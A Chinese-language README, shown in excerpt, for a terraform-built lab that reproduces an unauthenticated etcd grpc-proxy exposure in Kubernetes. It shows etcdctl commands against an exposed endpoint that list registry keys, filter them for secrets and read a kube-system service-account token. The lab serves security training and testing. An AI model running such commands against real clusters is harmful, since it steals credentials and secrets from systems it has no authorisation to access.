# kubernetes etcd grpc-proxy漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建kubernetes etcd组件 grpc-proxy未授权访问漏洞环境的靶场。

使用 terraform 构建环境后，用户可以通过 etcd组件 grpc-proxy未授权访问漏洞获取到 kubernetes中的api资源信息。
...
环境搭建完后，在 Outputs 处可以看到etcd grpc-proxy的访问地址。
...
```shell
➜  grpc_proxy_unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get / --prefix --keys-only|grep secrets
...
/registry/secrets/kube-system/deployment-controller-token-klbtj
...
➜  grpc_proxy_unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get /registry/secrets/kube-system/deployment-controller-token-klbtj
...
